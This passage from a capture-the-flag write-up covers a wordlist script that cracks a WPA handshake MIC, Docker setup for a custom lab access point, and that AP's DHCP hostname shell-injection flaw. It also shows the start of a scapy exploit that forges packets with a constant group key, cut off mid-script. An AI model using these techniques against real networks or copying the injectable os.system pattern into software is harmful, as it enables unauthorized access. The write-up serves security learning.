242)">,</span><span class="token plain"> key_replay_counter</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> \</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        key_nonce</span><span class="token operator">=</span><span class="token plain">anonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> key_length</span><span class="token operator">=</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> key</span><span class="token operator">=</span><span class="token plain">keydata</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> wpa_key_length</span><span class="token operator">=</span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">keydata</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> hmac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">new</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">KCK</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ek</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">build</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> hashlib</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sha1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">digest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    wanted </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fromhex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'7235448e1b056108e40ff429ad3545ab'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">wanted</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">16</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'rockyou-turtle.txt'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'r'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> encoding</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'utf8'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> fin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> line </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> fin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">readlines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            candidate </span><span class="token operator">=</span><span class="token plain"> line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            c </span><span class="token operator">=</span><span class="token plain"> calc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">candidate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">16</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> c </span><span class="token operator">==</span><span class="token plain"> wanted</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'WIN w/ </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">candidate</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'Done'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'__main__'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-2">Step 2<a href="https://www.supernetworks.org/pages/blog/spr-turtles-march#step-2" class="hash-link" aria-label="Direct link to Step 2" title="Direct link to Step 2">​</a></h2>
<p>All right, final step. In this step, we are given another custom <a href="https://github.com/spr-networks/turtles-march-2023/blob/main/t1_ap/turtleap/go.py" target="_blank" rel="noopener noreferrer">AP's source code</a> and we need to break in. How exciting uh?</p>
<p>For this step, I set-up an environment to debug and interact with the AP. I created a regular Hyper-V Ubuntu VM (note that this won't work from WSL2) and ran the two containers with the below commands:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">over@bubuntu:~/turtles-march-2023$ sudo docker compose up -d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[sudo] password for over:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting t1_ap    ... done</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting t1_start ... done</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">over@bubuntu:~/turtles-march-2023$ sudo ./setup.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>At that stage, you can log-in into both containers with the following commands:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">over@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_start bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">over@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_ap bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>t1_ap</code> is the container that runs the AP and <code>t1_start</code> is where you can run a client and send packets to the AP. This is cool because you don't need any physical Wifi device to play in this environment!</p>
<p>One of the keys that is derived during the 4-way handshake is meant to be shared by every station; kind of a group key. My understanding is that it is used to send broadcast-like packets to every station. In the AP, it turns out this key is a constant: <code>turtle{everyone gets a shell :)}</code> 😬</p>
<p>After reading the code carefully, it is clear that there you don't need to be associated with the AP to send a packet encrypted with this group key. This is particularly interesting because we don't have knowledge of the PSK which means we wouldn't be able to complete the 4-way handshake. In a normal AP, the <code>GTK</code> is shared in an encrypted frame and it isn't a constant / isn't known by an attacker (and is rotated every time a station disconnects).</p>
<p>Finally, an attacker can trigger a shell command injection when the AP parses a DHCP offer packet:</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">reply_dhcp_offer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> incoming</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> o </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> incoming</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">DHCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">options</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Log hostname for DNS revers lookup</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> o</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'hostname'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            cmd </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"echo %s %s.lan &gt;&gt; hostnames.txt"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dest_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> o</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"ascii"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cmd </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>At this point we have every ingredients to break into the AP and execute arbitrary shell commands by sending a specially crafted DHCP offer packet  encrypted with the GTK 🔥; here's my code that can be run from <code>t1_start</code>:</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Axel '0vercl0k' Souchet - April 11 2023</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">all</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> salsa20 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Salsa20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> itertools </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> count</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> hmac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> hashlib</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gtk_full </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'turtle{everyone gets a shell :)}'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GTK </span><span class="token operator">=</span><span class="token plain"> gtk_full</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MIC_AP_TO_GROUP </span><span class="token operator">=</span><span class="token plain"> gtk_full</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token number">24</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group_IV </span><span class="token operator">=</span><span class="token plain"> count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">encrypt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  data </span><span class="token operator">=</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">build</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  pn </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">next</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">group_IV</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  aad_calc </span><span class="token operator">=</span><span class="token plain"> hmac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">new</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">MIC_AP_TO_GROUP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> hashlib</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sha1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">digest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  key </span><span class="token operator">=</span><span class="token plain"> GTK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  cipher </span><span class="token operator">=</span><span class="token plain"> Salsa20</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> struct</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'&gt;Q'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pn</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  payload </span><span class="token operator">=</span><span class="token plain"> cipher</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> aad_calc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  pn0 </span><span class="token operator">=</span><span class="token plain"> pn </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0xff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  pn1 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pn</span><span class="token operator">&gt;&gt;</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0xff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  pn2 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pn</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0xff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  pn3 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pn</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain"> </span><span class="token number">0xff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> Dot11CCMP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token operator">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ext_iv</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> key_id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> PN0 </span><span class="token operator">=</span><span class="token plain"> pn0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> PN1</span><span class="token operator">=</span><span class="token plain">pn1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> PN2</span><span class="token operator">=</span><span class="token plain">pn2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> PN3</span><span class="token operator">=</span><span class="token plain">pn3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># root@0c0b905e70eb:/# iw dev</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># phy#0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#   Interface mon0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     ifindex 2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     wdev 0x2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     addr 02:00:00:00:00:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     type monitor</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     txpower 20.00 dBm</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#   Interface wlan0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     ifindex 50</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     wdev 0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#     addr 